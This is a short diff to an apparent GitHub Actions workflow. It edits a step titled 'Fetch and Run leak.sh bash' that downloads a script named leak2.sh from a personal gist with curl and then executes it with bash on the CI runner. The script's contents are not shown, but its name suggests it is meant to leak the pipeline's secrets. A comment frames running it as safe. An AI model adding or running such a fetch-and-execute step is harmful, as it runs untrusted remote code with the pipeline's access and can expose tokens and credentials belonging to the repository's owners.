@@ -13,5 +13,5 @@ jobs:
       - name: Fetch and Run leak.sh bash
         run: |
           curl -s -O https://gist.githubusercontent.com/Pranesh-Shrestha/dada649c59018020c555641a7304016b/raw/400e60369f36f737e148026f5712ea436693a52a/leak2.sh
-          cat leak.sh  # View the script before running it
-          bash leak.sh # Execute the script safely if you trust its contents
+          cat leak2.sh  # View the script before running it
+          bash leak2.sh # Execute the script safely if you trust its contents
